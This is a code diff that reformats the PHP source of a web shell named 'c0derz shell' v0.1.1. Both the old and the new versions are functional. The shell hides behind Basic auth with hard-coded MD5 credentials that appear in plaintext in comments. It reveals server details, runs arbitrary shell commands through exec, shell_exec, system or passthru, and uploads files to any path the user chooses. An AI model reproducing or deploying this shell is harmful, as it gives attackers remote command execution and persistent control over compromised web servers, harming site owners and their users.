@@ -28,33 +28,35 @@ $authentification = 1;
 $name='63a9f0ea7bb98050796b649e85481845';//root
 $pass='5cdbe638246729485a5eab6b93f170e2';//c0derz
 $caption="Enter your login and password";
-if ($authentification &&  (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass))
-{
+if ($authentification &&  (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass)) {
     header("WWW-Authenticate: Basic realm=\"$caption\"");
     header("HTTP/1.0 401 Unauthorized");
     exit("<BODY text=#000000 vLink=#000000 aLink=#000000 link=#000000 bgcolor=#888888><h1>Error 401</h1><h2>Unauthorized access!</h2>");
 }
-if($achtung)
-  error_reporting(E_ALL&~E_NOTICE);
-else
-  error_reporting(0);
+if ($achtung) {
+    error_reporting(E_ALL&~E_NOTICE);
+} else {
+    error_reporting(0);
+}
   //---------------------
 
 //get page generating time
 if (!function_exists("get_micro_time")) {
- function get_micro_time() {
-  list($usec, $sec) = explode(" ", microtime());
-  return ((float)$usec + (float)$sec);
- }
+    function get_micro_time()
+    {
+        list($usec, $sec) = explode(" ", microtime());
+        return ((float)$usec + (float)$sec);
+    }
 }
-define("start_time",get_micro_time());
+define("start_time", get_micro_time());
 $cshver="<a href=http://c0derz.org.ua target='_BLANK' title='.::[c0derz shell]::.'><b>.::[csh]::.</b></a> v. 0.1.1 release";
  //-------------------------------
 
  //normalize text encoding
- function decode($buffer){
-return  convert_cyr_string ($buffer, 'd', 'w');
-}
+ function decode($buffer)
+ {
+     return  convert_cyr_string($buffer, 'd', 'w');
+ }
 //---------------------------------
 
 ?>
@@ -118,22 +120,22 @@ echo "<font size=1 face=verdana color=fcfcfc><b>Server info:</b></font><br>";
 //server info
 echo "Server name: <b><font color=#dcdcdc>".$SERVER_NAME."</b></font><br>";
 echo "Server IP adress:<b><font color=#dcdcdc>".$server_ip=gethostbyname($SERVER_NAME)."</b></font> <br>";
-echo (($safe_mode)?("Safe Mode: <font color=#ffffff><b>ON</b></font><br> "):
+echo(($safe_mode)?("Safe Mode: <font color=#ffffff><b>ON</b></font><br> "):
          ("Safe Mode: <font color=#555555><b>OFF</b></font><br> "));
 echo "OS: <font color=#dcdcdc>";
- if (empty($uname)){
-  echo (php_uname()."</font><br>");
- }else
-  echo $uname."</font><br>";
+ if (empty($uname)) {
+     echo(php_uname()."</font><br>");
+ } else {
+     echo $uname."</font><br>";
+ }
   echo 'User: <font color=#dcdcdc>' .get_current_user() . '</font><br>';
    echo "HTTP Server: <font color=#dcdcdc>".$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE']."</font><br>";
- echo ("PHP: <font color=#dcdcdc>".phpversion()."</font><br> ");
-  echo ("MySQL: ");
- if($mysql_stat=function_exists('mysql_connect')){
-  echo "<font color=#ffffff><b>ON</b> </font><b>";
- }
- else {
-  echo "<font color=#555555><b>OFF</b> </font><br>";
+ echo("PHP: <font color=#dcdcdc>".phpversion()."</font><br> ");
+  echo("MySQL: ");
+ if ($mysql_stat=function_exists('mysql_connect')) {
+     echo "<font color=#ffffff><b>ON</b> </font><b>";
+ } else {
+     echo "<font color=#555555><b>OFF</b> </font><br>";
  }
  //---------------------------
  ?>
@@ -190,11 +192,15 @@ echo "OS: <font color=#dcdcdc>";
 <br>
 <?php
 
-if (!empty($_GET['mode'])) {$mode = $_GET['mode'];}
-elseif (!empty($_POST['mode'])) {$mode = $_POST['mode'];}
-else {$mode = "shell";}
+if (!empty($_GET['mode'])) {
+    $mode = $_GET['mode'];
+} elseif (!empty($_POST['mode'])) {
+    $mode = $_POST['mode'];
+} else {
+    $mode = "shell";
+}
 
-switch($mode) {
+switch ($mode) {
 
 case "shell":
 $foot_stat="Current directory: <b><font color=#dcdcdc>[".getcwd()."]</font></b></tr>";
@@ -203,51 +209,39 @@ chdir($dir);
 
 function execute($com)
 {
-
- if (!empty($com))
- {
-  if(function_exists('exec'))
-   {
-    exec($com,$arr);
-   echo implode('
-',$arr);
-   }
-  elseif(function_exists('shell_exec'))
-   {
-    echo shell_exec($com);
-   }
-  elseif(function_exists('system'))
-{
-    echo system($com);
+    if (!empty($com)) {
+        if (function_exists('exec')) {
+            exec($com, $arr);
+            echo implode('
+', $arr);
+        } elseif (function_exists('shell_exec')) {
+            echo shell_exec($com);
+        } elseif (function_exists('system')) {
+            echo system($com);
+        } elseif (function_exists('passthru')) {
+            echo passthru($com);
+        }
+    }
 }
-  elseif(function_exists('passthru'))
-   {
-    echo passthru($com);
-   }
-}
-
-}
-if ($cmd){
-
-if($sertype == "winda"){
-ob_start();
-execute($cmd);
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-else{
-ob_start();
-echo decode(execute($cmd));
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-if (trim($buffer)){
-echo "<center><table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">Executed command: <b><font color=#dcdcdc>[$cmd]</font></b></form></td></tr></table></center><left><textarea cols=200 rows=40 style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\">";
-echo decode($buffer);
-echo "</textarea></center></div>";
-}
+if ($cmd) {
+    if ($sertype == "winda") {
+        ob_start();
+        execute($cmd);
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    } else {
+        ob_start();
+        echo decode(execute($cmd));
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    }
+    if (trim($buffer)) {
+        echo "<center><table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">Executed command: <b><font color=#dcdcdc>[$cmd]</font></b></form></td></tr></table></center><left><textarea cols=200 rows=40 style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\">";
+        echo decode($buffer);
+        echo "</textarea></center></div>";
+    }
 }
 echo "<table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">
 <form action=\"$REQUEST_URI\" method=\"POST\">
@@ -278,19 +272,21 @@ echo"<table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=6776
 <tr>
 <td><font size=\"1\" face=\"verdana\" color=\"#000000\">Path:</font></td>
 <td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\" style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"><input type=\"submit\" value=\"Send\" style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></td></tr></form></font></table></td></tr></table>";
-if (isset($_POST['path'])){
-$uploadfile = $_POST['path'].$_FILES['file']['name'];
-if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}
-echo"<table width=100%><tr><td style=\"border: 1 solid \"000000\" bgcolor=\"888888\"><font size=\"1\" face=\"verdana\" color=\"#000000\">";
-if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
-    echo "File sucessfuly uploaded in to directory: <font color=ffffff>[$uploadfile]</font><br>";
-    echo "Name: <font color=ffffff>[".$_FILES['file']['name']. "]</font><br>";
-    echo "Size: <font color=ffffff>[" .$_FILES['file']['size']. "]</font> Bytes<br>";
-} else {
-    print "Couldn't to upload file. Information:<br>";
-    print_r($_FILES);
-}
-echo"</td></tr></table>";
+if (isset($_POST['path'])) {
+    $uploadfile = $_POST['path'].$_FILES['file']['name'];
+    if ($_POST['path']=="") {
+        $uploadfile = $_FILES['file']['name'];
+    }
+    echo"<table width=100%><tr><td style=\"border: 1 solid \"000000\" bgcolor=\"888888\"><font size=\"1\" face=\"verdana\" color=\"#000000\">";
+    if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
+        echo "File sucessfuly uploaded in to directory: <font color=ffffff>[$uploadfile]</font><br>";
+        echo "Name: <font color=ffffff>[".$_FILES['file']['name']. "]</font><br>";
+        echo "Size: <font color=ffffff>[" .$_FILES['file']['size']. "]</font> Bytes<br>";
+    } else {
+        print "Couldn't to upload file. Information:<br>";
+        print_r($_FILES);
+    }
+    echo"</td></tr></table>";
 }
 break;
 }
@@ -324,7 +320,7 @@ break;
 <center>
 
 <?php
-echo "-=[".$cshver." | Page generation time: <font color=#fcfcfc>[<b>".round(get_micro_time()-start_time,4). "</b>]</font> seconds.]=-";
+echo "-=[".$cshver." | Page generation time: <font color=#fcfcfc>[<b>".round(get_micro_time()-start_time, 4). "</b>]</font> seconds.]=-";
 ?>
 
  </td>
